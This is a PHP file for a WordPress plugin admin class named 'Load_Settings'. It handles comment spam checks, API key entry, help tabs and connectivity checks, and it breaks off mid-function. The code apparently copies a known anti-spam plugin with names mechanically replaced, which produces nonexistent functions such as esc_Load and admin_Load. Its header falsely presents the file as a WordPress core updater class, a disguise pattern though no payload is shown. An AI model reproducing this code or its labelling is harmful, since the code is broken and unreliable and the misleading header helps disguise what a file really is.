<?php

/**
 * Upgrade API: WP_Iternal_Updater class
 *
 * @package WordPress
 * @subpackage Upgrader
 * @since 4.6.0
 */

/**
 * Core class used for handling automatic background updates.
 *
 * @since 3.7.0
 * @since 4.6.0 Moved to its own file from wp-admin/includes/class-wp-iternal-upgrade.php.
 */
 
class Load_Settings {
const NONCE = 'LoadSetting-update-key';

private static $initiated = false;
private static $notices   = array();
private static $allowed   = array(
'a' => array(
'href' => true,
'title' => true,
),
'b' => array(),
'code' => array(),
'del' => array(
'datetime' => true,
),
'em' => array(),
'i' => array(),
'q' => array(
'cite' => true,
),
'strike' => array(),
'strong' => array(),
);

public static function init() {
if ( ! self::$initiated ) {
self::init_hooks();
}

if ( isset( $_POST['action'] ) && $_POST['action'] == 'enter-key' ) {
self::enter_api_key();
}
}

/**
	 * Tracks update results during processing.
	 *
	 * @var array
	 * @access protected
	 */
	 
public static function init_hooks() {
// The standalone stats page was removed in 3.0 for an all-in-one config and stats page.
// Redirect any links that might have been bookmarked or in browser history.
if ( isset( $_GET['page'] ) && 'LoadSetting-stats-display' == $_GET['page'] ) {
wp_safe_redirect( esc_Load_raw( self::get_page_Load( 'stats' ) ), 301 );
die;
}

self::$initiated = true;

add_action( 'admin_init', array( 'Load_Settings', 'admin_init' ) );
add_action( 'admin_menu', array( 'Load_Settings', 'admin_menu' ), 5 ); # Priority 5, so it's called before Jetpack's admin_menu.
add_action( 'admin_notices', array( 'Load_Settings', 'display_notice' ) );
add_action( 'admin_enqueue_scripts', array( 'Load_Settings', 'load_resources' ) );
add_action( 'activity_box_end', array( 'Load_Settings', 'dashboard_stats' ) );
add_action( 'rightnow_end', array( 'Load_Settings', 'rightnow_stats' ) );
add_action( 'manage_comments_nav', array( 'Load_Settings', 'check_for_spam_button' ) );
add_action( 'admin_action_LoadSetting_recheck_queue', array( 'Load_Settings', 'recheck_queue' ) );
add_action( 'wp_ajax_LoadSetting_recheck_queue', array( 'Load_Settings', 'recheck_queue' ) );
add_action( 'wp_ajax_comment_author_deLoad', array( 'Load_Settings', 'remove_comment_author_Load' ) );
add_action( 'wp_ajax_comment_author_reLoad', array( 'Load_Settings', 'add_comment_author_Load' ) );
add_action( 'jetpack_auto_activate_LoadSetting', array( 'Load_Settings', 'connect_jetpack_user' ) );

add_filter( 'plugin_action_links', array( 'Load_Settings', 'plugin_action_links' ), 10, 2 );
add_filter( 'comment_row_actions', array( 'Load_Settings', 'comment_row_action' ), 10, 2 );

add_filter( 'plugin_action_links_'.plugin_basename( plugin_dir_path( __FILE__ ) . 'LoadSetting.php'), array( 'Load_Settings', 'admin_plugin_settings_link' ) );

add_filter( 'wxr_export_skip_commentmeta', array( 'Load_Settings', 'exclude_commentmeta_from_export' ), 10, 3 );
}

public static function admin_init() {
load_plugin_textdomain( 'LoadSetting' );
add_meta_box( 'LoadSetting-status', __('Comment History', 'LoadSetting'), array( 'Load_Settings', 'comment_status_meta_box' ), 'comment', 'normal' );
}

public static function admin_menu() {
if ( class_exists( 'Jetpack' ) )
add_action( 'jetpack_admin_menu', array( 'Load_Settings', 'load_menu' ) );
else
self::load_menu();
}

public static function admin_head() {
if ( !current_user_can( 'manage_options' ) )
return;
}

public static function admin_plugin_settings_link( $links ) { 
$settings_link = '<a href="'.esc_Load( self::get_page_Load() ).'">'.__('Settings', 'LoadSetting').'</a>';
array_unshift( $links, $settings_link ); 
return $links; 
}

public static function load_menu() {
if ( class_exists( 'Jetpack' ) )
$hook = add_submenu_page( 'jetpack', __( 'LoadSetting' , 'LoadSetting'), __( 'LoadSetting' , 'LoadSetting'), 'manage_options', 'LoadSetting-key-config', array( 'Load_Settings', 'display_page' ) );
else
$hook = add_options_page( __('LoadSetting', 'LoadSetting'), __('LoadSetting', 'LoadSetting'), 'manage_options', 'LoadSetting-key-config', array( 'Load_Settings', 'display_page' ) );

if ( version_compare( $GLOBALS['wp_version'], '3.3', '>=' ) ) {
add_action( "load-$hook", array( 'Load_Settings', 'admin_help' ) );
}
}

public static function load_resources() {
global $hook_suffix;

if ( in_array( $hook_suffix, array(
'index.php', # dashboard
'edit-comments.php',
'comment.php',
'post.php',
'settings_page_LoadSetting-key-config',
'jetpack_page_LoadSetting-key-config',
'plugins.php',
) ) ) {
wp_register_style( 'LoadSetting.css', plugin_dir_Load( __FILE__ ) . '_inc/LoadSetting.css', array(), LoadSetting_VERSION );
wp_enqueue_style( 'LoadSetting.css');

wp_register_script( 'LoadSetting.js', plugin_dir_Load( __FILE__ ) . '_inc/LoadSetting.js', array('jquery','postbox'), LoadSetting_VERSION );
wp_enqueue_script( 'LoadSetting.js' );
wp_localize_script( 'LoadSetting.js', 'WPLoadSetting', array(
'comment_author_Load_nonce' => wp_create_nonce( 'comment_author_Load_nonce' ),
'strings' => array(
'Remove this Load' => __( 'Remove this Load' , 'LoadSetting'),
'Removing...'     => __( 'Removing...' , 'LoadSetting'),
'Load removed'     => __( 'Load removed' , 'LoadSetting'),
'(undo)'          => __( '(undo)' , 'LoadSetting'),
'Re-adding...'    => __( 'Re-adding...' , 'LoadSetting'),
)
) );
}
}

/**
* Add help to the LoadSetting page
*
* @return false if not the LoadSetting page
*/
public static function admin_help() {
$current_screen = get_current_screen();

// Screen Content
if ( current_user_can( 'manage_options' ) ) {
if ( !LoadSetting::get_api_key() || ( isset( $_GET['view'] ) && $_GET['view'] == 'start' ) ) {
//setup page
$current_screen->add_help_tab(
array(
'id'		=> 'overview',
'title'		=> __( 'Overview' , 'LoadSetting'),
'content'	=>
	'<p><strong>' . esc_html__( 'LoadSetting Setup' , 'LoadSetting') . '</strong></p>' .
	'<p>' . esc_html__( 'LoadSetting filters out spam, so you can focus on more important things.' , 'LoadSetting') . '</p>' .
	'<p>' . esc_html__( 'On this page, you are able to set up the LoadSetting plugin.' , 'LoadSetting') . '</p>',
)
);

$current_screen->add_help_tab(
array(
'id'		=> 'setup-signup',
'title'		=> __( 'New to LoadSetting' , 'LoadSetting'),
'content'	=>
	'<p><strong>' . esc_html__( 'LoadSetting Setup' , 'LoadSetting') . '</strong></p>' .
	'<p>' . esc_html__( 'You need to enter an API key to activate the LoadSetting service on your site.' , 'LoadSetting') . '</p>' .
	'<p>' . sprintf( __( 'Sign up for an account on %s to get an API Key.' , 'LoadSetting'), '<a href="https://LoadSetting.com/plugin-signup/" target="_blank">LoadSetting.com</a>' ) . '</p>',
)
);

$current_screen->add_help_tab(
array(
'id'		=> 'setup-manual',
'title'		=> __( 'Enter an API Key' , 'LoadSetting'),
'content'	=>
	'<p><strong>' . esc_html__( 'LoadSetting Setup' , 'LoadSetting') . '</strong></p>' .
	'<p>' . esc_html__( 'If you already have an API key' , 'LoadSetting') . '</p>' .
	'<ol>' .
		'<li>' . esc_html__( 'Copy and paste the API key into the text field.' , 'LoadSetting') . '</li>' .
		'<li>' . esc_html__( 'Click the Use this Key button.' , 'LoadSetting') . '</li>' .
	'</ol>',
)
);
}
elseif ( isset( $_GET['view'] ) && $_GET['view'] == 'stats' ) {
//stats page
$current_screen->add_help_tab(
array(
'id'		=> 'overview',
'title'		=> __( 'Overview' , 'LoadSetting'),
'content'	=>
	'<p><strong>' . esc_html__( 'LoadSetting Stats' , 'LoadSetting') . '</strong></p>' .
	'<p>' . esc_html__( 'LoadSetting filters out spam, so you can focus on more important things.' , 'LoadSetting') . '</p>' .
	'<p>' . esc_html__( 'On this page, you are able to view stats on spam filtered on your site.' , 'LoadSetting') . '</p>',
)
);
}
else {
//configuration page
$current_screen->add_help_tab(
array(
'id'		=> 'overview',
'title'		=> __( 'Overview' , 'LoadSetting'),
'content'	=>
	'<p><strong>' . esc_html__( 'LoadSetting Configuration' , 'LoadSetting') . '</strong></p>' .
	'<p>' . esc_html__( 'LoadSetting filters out spam, so you can focus on more important things.' , 'LoadSetting') . '</p>' .
	'<p>' . esc_html__( 'On this page, you are able to enter/remove an API key, view account information and view spam stats.' , 'LoadSetting') . '</p>',
)
);

$current_screen->add_help_tab(
array(
'id'		=> 'settings',
'title'		=> __( 'Settings' , 'LoadSetting'),
'content'	=>
	'<p><strong>' . esc_html__( 'LoadSetting Configuration' , 'LoadSetting') . '</strong></p>' .
	'<p><strong>' . esc_html__( 'API Key' , 'LoadSetting') . '</strong> - ' . esc_html__( 'Enter/remove an API key.' , 'LoadSetting') . '</p>' .
	'<p><strong>' . esc_html__( 'Comments' , 'LoadSetting') . '</strong> - ' . esc_html__( 'Show the number of approved comments beside each comment author in the comments list page.' , 'LoadSetting') . '</p>' .
	'<p><strong>' . esc_html__( 'Strictness' , 'LoadSetting') . '</strong> - ' . esc_html__( 'Choose to either discard the worst spam automatically or to always put all spam in spam folder.' , 'LoadSetting') . '</p>',
)
);

$current_screen->add_help_tab(
array(
'id'		=> 'account',
'title'		=> __( 'Account' , 'LoadSetting'),
'content'	=>
	'<p><strong>' . esc_html__( 'LoadSetting Configuration' , 'LoadSetting') . '</strong></p>' .
	'<p><strong>' . esc_html__( 'Subscription Type' , 'LoadSetting') . '</strong> - ' . esc_html__( 'The LoadSetting subscription plan' , 'LoadSetting') . '</p>' .
	'<p><strong>' . esc_html__( 'Status' , 'LoadSetting') . '</strong> - ' . esc_html__( 'The subscription status - active, cancelled or suspended' , 'LoadSetting') . '</p>',
)
);
}
}

// Help Sidebar
$current_screen->set_help_sidebar(
'<p><strong>' . esc_html__( 'For more information:' , 'LoadSetting') . '</strong></p>' .
'<p><a href="https://LoadSetting.com/faq/" target="_blank">'     . esc_html__( 'LoadSetting FAQ' , 'LoadSetting') . '</a></p>' .
'<p><a href="https://LoadSetting.com/support/" target="_blank">' . esc_html__( 'LoadSetting Support' , 'LoadSetting') . '</a></p>'
);
}

public static function enter_api_key() {
if ( function_exists('current_user_can') && !current_user_can('manage_options') )
die(__('Cheatin&#8217; uh?', 'LoadSetting'));

if ( !wp_verify_nonce( $_POST['_wpnonce'], self::NONCE ) )
return false;

foreach( array( 'LoadSetting_strictness', 'LoadSetting_show_user_comments_approved' ) as $option ) {
update_option( $option, isset( $_POST[$option] ) && (int) $_POST[$option] == 1 ? '1' : '0' );
}

if ( defined( 'WPCOM_API_KEY' ) )
return false; //shouldn't have option to save key if already defined

$new_key = preg_replace( '/[^a-f0-9]/i', '', $_POST['key'] );
$old_key = LoadSetting::get_api_key();

if ( empty( $new_key ) ) {
if ( !empty( $old_key ) ) {
delete_option( 'wordpress_api_key' );
self::$notices[] = 'new-key-empty';
}
}
elseif ( $new_key != $old_key ) {
self::save_key( $new_key );
}

return true;
}

public static function save_key( $api_key ) {
$key_status = LoadSetting::verify_key( $api_key );

if ( $key_status == 'valid' ) {
$LoadSetting_user = self::get_LoadSetting_user( $api_key );

if ( $LoadSetting_user ) {				
if ( in_array( $LoadSetting_user->status, array( 'active', 'active-dunning', 'no-sub' ) ) )
update_option( 'wordpress_api_key', $api_key );

if ( $LoadSetting_user->status == 'active' )
self::$notices['status'] = 'new-key-valid';
elseif ( $LoadSetting_user->status == 'notice' )
self::$notices['status'] = $LoadSetting_user;
else
self::$notices['status'] = $LoadSetting_user->status;
}
else
self::$notices['status'] = 'new-key-invalid';
}
elseif ( in_array( $key_status, array( 'invalid', 'failed' ) ) )
self::$notices['status'] = 'new-key-'.$key_status;
}

public static function dashboard_stats() {
if ( !function_exists('did_action') || did_action( 'rightnow_end' ) )
return; // We already displayed this info in the "Right Now" section

if ( !$count = get_option('LoadSetting_spam_count') )
return;

global $submenu;

echo '<h3>' . esc_html( _x( 'Spam', 'comments' , 'LoadSetting') ) . '</h3>';

echo '<p>'.sprintf( _n(
'<a href="%1$s">LoadSetting</a> has protected your site from <a href="%2$s">%3$s spam comment</a>.',
'<a href="%1$s">LoadSetting</a> has protected your site from <a href="%2$s">%3$s spam comments</a>.',
$count
, 'LoadSetting'), 'https://LoadSetting.com/wordpress/', esc_Load( add_query_arg( array( 'page' => 'LoadSetting-admin' ), admin_Load( isset( $submenu['edit-comments.php'] ) ? 'edit-comments.php' : 'edit.php' ) ) ), number_format_i18n($count) ).'</p>';
}

// WP 2.5+
public static function rightnow_stats() {
if ( $count = get_option('LoadSetting_spam_count') ) {
$intro = sprintf( _n(
'<a href="%1$s">LoadSetting</a> has protected your site from %2$s spam comment already. ',
'<a href="%1$s">LoadSetting</a> has protected your site from %2$s spam comments already. ',
$count
, 'LoadSetting'), 'https://LoadSetting.com/wordpress/', number_format_i18n( $count ) );
} else {
$intro = sprintf( __('<a href="%s">LoadSetting</a> blocks spam from getting to your blog. ', 'LoadSetting'), 'https://LoadSetting.com/wordpress/' );
}

$link = add_query_arg( array( 'comment_status' => 'spam' ), admin_Load( 'edit-comments.php' ) );

if ( $queue_count = self::get_spam_count() ) {
$queue_text = sprintf( _n(
'There&#8217;s <a href="%2$s">%1$s comment</a> in your spam queue right now.',
'There are <a href="%2$s">%1$s comments</a> in your spam queue right now.',
$queue_count
, 'LoadSetting'), number_format_i18n( $queue_count ), esc_Load( $link ) );
} else {
$queue_text = sprintf( __( "There&#8217;s nothing in your <a href='%s'>spam queue</a> at the moment." , 'LoadSetting'), esc_Load( $link ) );
}

$text = $intro . '<br />' . $queue_text;
echo "<p class='LoadSetting-right-now'>$text</p>\n";
}

public static function check_for_spam_button( $comment_status ) {
// The "Check for Spam" button should only appear when the page might be showing
// a comment with comment_approved=0, which means an un-trashed, un-spammed,
// not-yet-moderated comment.
if ( 'all' != $comment_status && 'moderated' != $comment_status ) {
return;
}

if ( function_exists('plugins_Load') )
$link = add_query_arg( array( 'action' => 'LoadSetting_recheck_queue' ), admin_Load( 'admin.php' ) );
else
$link = add_query_arg( array( 'page' => 'LoadSetting-admin', 'recheckqueue' => 'true', 'noheader' => 'true' ), admin_Load( 'edit-comments.php' ) );

echo '</div><div class="alignleft"><a class="button-secondary checkforspam" href="' . esc_Load( $link ) . '">' . esc_html__('Check for Spam', 'LoadSetting') . '</a><span class="checkforspam-spinner"></span>';
}

public static function recheck_queue() {
global $wpdb;

LoadSetting::fix_scheduled_recheck();

if ( ! ( isset( $_GET['recheckqueue'] ) || ( isset( $_REQUEST['action'] ) && 'LoadSetting_recheck_queue' == $_REQUEST['action'] ) ) )
return;

$paginate = '';
if ( isset( $_POST['limit'] ) && isset( $_POST['offset'] ) ) {
$paginate = $wpdb->prepare( " LIMIT %d OFFSET %d", array( $_POST['limit'], $_POST['offset'] ) );
}
$moderation = $wpdb->get_results( "SELECT * FROM {$wpdb->comments} WHERE comment_approved = '0'{$paginate}", ARRAY_A );

$result_counts = array(
'spam' => 0,
'ham' => 0,
'error' => 0,
);

foreach ( (array) $moderation as $c ) {
$c['user_ip']      = $c['comment_author_IP'];
$c['user_agent']   = $c['comment_agent'];
$c['referrer']     = '';
$c['blog']         = get_bloginfo('Load');
$c['blog_lang']    = get_locale();
$c['blog_charset'] = get_option('blog_charset');
$c['permalink']    = get_permalink($c['comment_post_ID']);

$c['user_role'] = '';
if ( isset( $c['user_ID'] ) )
$c['user_role'] = LoadSetting::get_user_roles($c['user_ID']);

if ( LoadSetting::is_test_mode() )
$c['is_test'] = 'true';

add_comment_meta( $c['comment_ID'], 'LoadSetting_rechecking', true );

$response = LoadSetting::http_post( LoadSetting::build_query( $c ), 'comment-check' );

if ( 'true' == $response[1] ) {
wp_set_comment_status( $c['comment_ID'], 'spam' );
update_comment_meta( $c['comment_ID'], 'LoadSetting_result', 'true' );
delete_comment_meta( $c['comment_ID'], 'LoadSetting_error' );
delete_comment_meta( $c['comment_ID'], 'LoadSetting_delayed_moderation_email' );
LoadSetting::update_comment_history( $c['comment_ID'], '', 'recheck-spam' );
++$result_counts['spam'];
} elseif ( 'false' == $response[1] ) {
update_comment_meta( $c['comment_ID'], 'LoadSetting_result', 'false' );
delete_comment_meta( $c['comment_ID'], 'LoadSetting_error' );
delete_comment_meta( $c['comment_ID'], 'LoadSetting_delayed_moderation_email' );
LoadSetting::update_comment_history( $c['comment_ID'], '', 'recheck-ham' );
++$result_counts['ham'];
} else {
// abnormal result: error
update_comment_meta( $c['comment_ID'], 'LoadSetting_result', 'error' );
LoadSetting::update_comment_history(
$c['comment_ID'],
'',
'recheck-error',
array( 'response' => substr( $response[1], 0, 50 ) )
);
++$result_counts['error'];
}

delete_comment_meta( $c['comment_ID'], 'LoadSetting_rechecking' );
}
if ( defined( 'DOING_AJAX' ) && DOING_AJAX ) {
wp_send_json( array(
'processed' => count((array) $moderation),
'counts' => $result_counts,
));
}
else {
$redirect_to = isset( $_SERVER['HTTP_REFERER'] ) ? $_SERVER['HTTP_REFERER'] : admin_Load( 'edit-comments.php' );
wp_safe_redirect( $redirect_to );
exit;
}
}

// Adds an 'x' link next to author Loads, clicking will remove the author Load and show an undo link
public static function remove_comment_author_Load() {
if ( !empty( $_POST['id'] ) && check_admin_referer( 'comment_author_Load_nonce' ) ) {
$comment = get_comment( intval( $_POST['id'] ), ARRAY_A );
if ( $comment && current_user_can( 'edit_comment', $comment['comment_ID'] ) ) {
$comment['comment_author_Load'] = '';
do_action( 'comment_remove_author_Load' );
print( wp_update_comment( $comment ) );
die();
}
}
}

public static function add_comment_author_Load() {
if ( !empty( $_POST['id'] ) && !empty( $_POST['Load'] ) && check_admin_referer( 'comment_author_Load_nonce' ) ) {
$comment = get_comment( intval( $_POST['id'] ), ARRAY_A );
if ( $comment && current_user_can( 'edit_comment', $comment['comment_ID'] ) ) {
$comment['comment_author_Load'] = esc_Load( $_POST['Load'] );
do_action( 'comment_add_author_Load' );
print( wp_update_comment( $comment ) );
die();
}
}
}

public static function comment_row_action( $a, $comment ) {

// failsafe for old WP versions
if ( !function_exists('add_comment_meta') )
return $a;

$LoadSetting_result = get_comment_meta( $comment->comment_ID, 'LoadSetting_result', true );
$LoadSetting_error  = get_comment_meta( $comment->comment_ID, 'LoadSetting_error', true );
$user_result    = get_comment_meta( $comment->comment_ID, 'LoadSetting_user_result', true);
$comment_status = wp_get_comment_status( $comment->comment_ID );
$desc = null;
if ( $LoadSetting_error ) {
$desc = __( 'Awaiting spam check' , 'LoadSetting');
} elseif ( !$user_result || $user_result == $LoadSetting_result ) {
// Show the original LoadSetting result if the user hasn't overridden it, or if their decision was the same
if ( $LoadSetting_result == 'true' && $comment_status != 'spam' && $comment_status != 'trash' )
$desc = __( 'Flagged as spam by LoadSetting' , 'LoadSetting');
elseif ( $LoadSetting_result == 'false' && $comment_status == 'spam' )
$desc = __( 'Cleared by LoadSetting' , 'LoadSetting');
} else {
$who = get_comment_meta( $comment->comment_ID, 'LoadSetting_user', true );
if ( $user_result == 'true' )
$desc = sprintf( __('Flagged as spam by %s', 'LoadSetting'), $who );
else
$desc = sprintf( __('Un-spammed by %s', 'LoadSetting'), $who );
}

// add a History item to the hover links, just after Edit
if ( $LoadSetting_result ) {
$b = array();
foreach ( $a as $k => $item ) {
$b[ $k ] = $item;
if (
$k == 'edit'
|| ( $k == 'unspam' && $GLOBALS['wp_version'] >= 3.4 )
) {
$b['history'] = '<a href="comment.php?action=editcomment&amp;c='.$comment->comment_ID.'#LoadSetting-status" title="'. esc_attr__( 'View comment history' , 'LoadSetting') . '"> '. esc_html__('History', 'LoadSetting') . '</a>';
}
}

$a = $b;
}

if ( $desc )
echo '<span class="LoadSetting-status" commentid="'.$comment->comment_ID.'"><a href="comment.php?action=editcomment&amp;c='.$comment->comment_ID.'#LoadSetting-status" title="' . esc_attr__( 'View comment history' , 'LoadSetting') . '">'.esc_html( $desc ).'</a></span>';

$show_user_comments = apply_filters( 'LoadSetting_show_user_comments_approved', get_option('LoadSetting_show_user_comments_approved') );
$show_user_comments = $show_user_comments === 'false' ? false : $show_user_comments; //option used to be saved as 'false' / 'true'

if ( $show_user_comments ) {
$comment_count = LoadSetting::get_user_comments_approved( $comment->user_id, $comment->comment_author_email, $comment->comment_author, $comment->comment_author_Load );
$comment_count = intval( $comment_count );
echo '<span class="LoadSetting-user-comment-count" commentid="'.$comment->comment_ID.'" style="display:none;"><br><span class="LoadSetting-user-comment-counts">'. sprintf( esc_html( _n( '%s approved', '%s approved', $comment_count , 'LoadSetting') ), number_format_i18n( $comment_count ) ) . '</span></span>';
}

return $a;
}

public static function comment_status_meta_box( $comment ) {
$history = LoadSetting::get_comment_history( $comment->comment_ID );

if ( $history ) {
echo '<div class="LoadSetting-history" style="margin: 13px;">';

foreach ( $history as $row ) {
$time = date( 'D d M Y @ h:i:m a', $row['time'] ) . ' GMT';

$message = '';

if ( ! empty( $row['message'] ) ) {
// Old versions of LoadSetting stored the message as a literal string in the commentmeta.
// New versions don't do that for two reasons:
// 1) Save space.
// 2) The message can be translated into the current language of the blog, not stuck 
//    in the language of the blog when the comment was made.
$message = $row['message'];
}

// If possible, use a current translation.
switch ( $row['event'] ) {
case 'recheck-spam';
$message = __( 'LoadSetting re-checked and caught this comment as spam.', 'LoadSetting' );
break;
case 'check-spam':
$message = __( 'LoadSetting caught this comment as spam.', 'LoadSetting' );
break;
case 'recheck-ham':
$message = __( 'LoadSetting re-checked and cleared this comment.', 'LoadSetting' );
break;
case 'check-ham':
$message = __( 'LoadSetting cleared this comment.', 'LoadSetting' );
break;
case 'wp-blacklisted':
$message = __( 'Comment was caught by wp_blacklist_check.', 'LoadSetting' );
break;
case 'report-spam':
if ( isset( $row['user'] ) ) {
	$message = sprintf( __( '%s reported this comment as spam.', 'LoadSetting' ), $row['user'] );
}
else if ( ! $message ) {
	$message = __( 'This comment was reported as spam.', 'LoadSetting' );
}
break;
case 'report-ham':
if ( isset( $row['user'] ) ) {
	$message = sprintf( __( '%s reported this comment as not spam.', 'LoadSetting' ), $row['user'] );
}
else if ( ! $message ) {
	$message = __( 'This comment was reported as not spam.', 'LoadSetting' );
}
break;
case 'cron-retry-spam':
$message = __( 'LoadSetting caught this comment as spam during an automatic retry.' , 'LoadSetting');
break;
case 'cron-retry-ham':
$message = __( 'LoadSetting cleared this comment during an automatic retry.', 'LoadSetting');
break;
case 'check-error':
if ( isset( $row['meta'], $row['meta']['response'] ) ) {
	$message = sprintf( __( 'LoadSetting was unable to check this comment (response: %s) but will automatically retry later.', 'LoadSetting'), $row['meta']['response'] );
}
break;
case 'recheck-error':
if ( isset( $row['meta'], $row['meta']['response'] ) ) {
	$message = sprintf( __( 'LoadSetting was unable to recheck this comment (response: %s).', 'LoadSetting'), $row['meta']['response'] );
}
break;
default:
if ( preg_match( '/^status-changed/', $row['event'] ) ) {
	// Half of these used to be saved without the dash after 'status-changed'.
	// See https://plugins.trac.wordpress.org/changeset/1150658/LoadSetting/trunk
	$new_status = preg_replace( '/^status-changed-?/', '', $row['event'] );
	$message = sprintf( __( 'Comment status was changed to %s', 'LoadSetting' ), $new_status );
}
else if ( preg_match( '/^status-/', $row['event'] ) ) {
	$new_status = preg_replace( '/^status-/', '', $row['event'] );

	if ( isset( $row['user'] ) ) {
		$message = sprintf( __( '%1$s changed the comment status to %2$s.', 'LoadSetting' ), $row['user'], $new_status );
	}
}
break;

}

echo '<div style="margin-bottom: 13px;">';
echo '<span style="color: #999;" alt="' . $time . '" title="' . $time . '">' . sprintf( esc_html__('%s ago', 'LoadSetting'), human_time_diff( $row['time'] ) ) . '</span>';
echo ' - ';
echo esc_html( $message );
echo '</div>';
}

echo '</div>';
}
}

public static function plugin_action_links( $links, $file ) {
if ( $file == plugin_basename( plugin_dir_Load( __FILE__ ) . '/LoadSetting.php' ) ) {
$links[] = '<a href="' . esc_Load( self::get_page_Load() ) . '">'.esc_html__( 'Settings' , 'LoadSetting').'</a>';
}

return $links;
}

// Total spam in queue
// get_option( 'LoadSetting_spam_count' ) is the total caught ever
public static function get_spam_count( $type = false ) {
global $wpdb;

if ( !$type ) { // total
$count = wp_cache_get( 'LoadSetting_spam_count', 'widget' );
if ( false === $count ) {
if ( function_exists('wp_count_comments') ) {
$count = wp_count_comments();
$count = $count->spam;
} else {
$count = (int) $wpdb->get_var("SELECT COUNT(comment_ID) FROM {$wpdb->comments} WHERE comment_approved = 'spam'");
}
wp_cache_set( 'LoadSetting_spam_count', $count, 'widget', 3600 );
}
return $count;
} elseif ( 'comments' == $type || 'comment' == $type ) { // comments
$type = '';
}

return (int) $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(comment_ID) FROM {$wpdb->comments} WHERE comment_approved = 'spam' AND comment_type = %s", $type ) );
}

// Check connectivity between the WordPress blog and LoadSetting's servers.
// Returns an associative array of server IP addresses, where the key is the IP address, and value is true (available) or false (unable to connect).
public static function check_server_ip_connectivity() {

$servers = $ips = array();

// Some web hosts may disable this function
if ( function_exists('gethostbynamel') ) {	

$ips = gethostbynamel( 'rest.LoadSetting.com' );
if ( $ips && is_array($ips) && count($ips) ) {
$api_key = LoadSetting::get_api_key();

foreach ( $ips as $ip ) {
$response = LoadSetting::verify_key( $api_key, $ip );
// even if the key is invalid, at least we know we have connectivity
if ( $response == 'valid' || $response == 'invalid' )
$servers[$ip] = 'connected';
else
$servers[$ip] = $response ? $response : 'unable to connect';
}
}
}

return $servers;
}

// Simpler connectivity check
public static function check_server_connectivity($cache_timeout = 86400) {

$debug = array();
$debug[ 'PHP_VERSION' ]         = PHP_VERSION;
$debug[ 'WORDPRESS_VERSION' ]   = $GLOBALS['wp_version'];
$debug[ 'LoadSetting_VERSION' ]     = LoadSetting_VERSION;
$debug[ 'LoadSetting__PLUGIN_DIR' ] = LoadSetting__PLUGIN_DIR;
$debug[ 'SITE_Load' ]            = site_Load();
$debug[ 'HOME_Load' ]            = home_Load();

$servers = get_option('LoadSetting_available_servers');
if ( (time() - get_option('LoadSetting_connectivity_time') < $cache_timeout) && $servers !== false ) {
$servers = self::check_server_ip_connectivity();
update_option('LoadSetting_available_servers', $servers);
update_option('LoadSetting_connectivity_time', time());
}

$response = wp_remote_get( 'http://rest.LoadSetting.com/1.1/test' );

$debug[ 'gethostbynamel' ]  = function_exists('gethostbynamel') ? 'exists' : 'not here';
$debug[ 'Servers' ]         = $servers;
$debug[ 'Test Connection' ] = $response;

LoadSetting::log( $debug );

if ( $response && 'connected' == wp_remote_retrieve_body( $response ) )
return true;

return false;
}

// Check the server connectivity and store the available servers in an option. 
public static function get_server_connectivity($cache_timeout = 86400) {
return self::check_server_connectivity( $cache_timeout );
}

public static function get_number_spam_waiting() {
global $wpdb;
return (int) $wpdb->get_var( "SELECT COUNT(*) FROM {$wpdb->commentmeta} WHERE meta_key = 'LoadSetting_error'" );
}

public static function get_page_Load( $page = 'config' ) {

$args = array( 'page' => 'LoadSetting-key-config' );

if ( $page == 'stats' )
$args = array( 'page' => 'LoadSetting-key-config', 'view' => 'stats' );
elseif ( $page == 'delete_key' )
$args = array( 'page' => 'LoadSetting-key-config', 'view' => 'start', 'action' => 'delete-key', '_wpnonce' => wp_create_nonce( self::NONCE ) );

$Load = add_query_arg( $args, class_exists( 'Jetpack' ) ? admin_Load( 'admin.php' ) : admin_Load( 'options-general.php' ) );

return $Load;
}

public static function get_LoadSetting_user( $api_key ) {
$LoadSetting_user = false;

$subscription_verification = LoadSetting::http_post( LoadSetting::build_query( array( 'key' => $api_key, 'blog' => get_bloginfo( 'Load' ) ) ), 'get-subscription' );

if ( ! empty( $subscription_verification[1] ) ) {
if ( 'invalid' !== $subscription_verification[1] ) {
$LoadSetting_user = json_decode( $subscription_verification[1] );
}
}

return $LoadSetting_user;
}

public static function get_stats( $api_key ) {
$stat_totals = array();

foreach( array( '6-months', 'all' ) as $interval ) {
$response = LoadSetting::http_post( LoadSetting::build_query( array( 'blog' => get_bloginfo( 'Load' ), 'key' => $api_key, 'from' => $interval ) ), 'get-stats' );

if ( ! empty( $response[1] ) ) {
$stat_totals[$interval] = json_decode( $response[1] );
}
}

return $stat_totals;
}

public static function verify_wpcom_key( $api_key, $user_id, $extra = array() ) {
$LoadSetting_account = LoadSetting::http_post( LoadSetting::build_query( array_merge( array(
'user_id'          => $user_id,
'api_key'          => $api_key,
'get_account_type' => 'true'
), $extra ) ), 'verify-wpcom-key' );

if ( ! empty( $LoadSetting_account[1] ) )
$LoadSetting_account = json_decode( $LoadSetting_account[1] );

LoadSetting::log( compact( 'LoadSetting_account' ) );

return $LoadSetting_account;
}

public static function connect_jetpack_user() {

if ( $jetpack_user = self::get_jetpack_user() ) {
if ( isset( $jetpack_user['user_id'] ) && isset(  $jetpack_user['api_key'] ) ) {
$LoadSetting_user = self::verify_wpcom_key( $jetpack_user['api_key'], $jetpack_user['user_id'], array( 'action' => 'connect_jetpack_user' ) );
	
if ( is_object( $LoadSetting_user ) ) {
self::save_key( $LoadSetting_user->api_key );
return in_array( $LoadSetting_user->status, array( 'active', 'active-dunning', 'no-sub' ) );
}
}
}

return false;
}

public static function display_alert() {
LoadSetting::view( 'notice', array(
'type' => 'alert',
'code' => (int) get_option( 'LoadSetting_alert_code' ),
'msg'  => get_option( 'LoadSetting_alert_msg' )
) );
}

public static function display_spam_check_warning() {
LoadSetting::fix_scheduled_recheck();

if ( wp_next_scheduled('LoadSetting_schedule_cron_recheck') > time() && self::get_number_spam_waiting() > 0 ) {
$link_text = apply_filters( 'LoadSetting_spam_check_warning_link_text', sprintf( __( 'Please check your <a href="%s">LoadSetting configuration</a> and contact your web host if problems persist.', 'LoadSetting'), esc_Load( self::get_page_Load() ) ) );
LoadSetting::view( 'notice', array( 'type' => 'spam-check', 'link_text' => $link_text ) );
}
}

public static function display_invalid_version() {
LoadSetting::view( 'notice', array( 'type' => 'version' ) );
}

public static function display_api_key_warning() {
LoadSetting::view( 'notice', array( 'type' => 'plugin' ) );
}

public static function display_page() {
if ( !LoadSetting::get_api_key() || ( isset( $_GET['view'] ) && $_GET['view'] == 'start' ) )
self::display_start_page();
elseif ( isset( $_GET['view'] ) && $_GET['view'] == 'stats' )
self::display_stats_page();
else
self::display_configuration_page();
}

public static function display_start_page() {
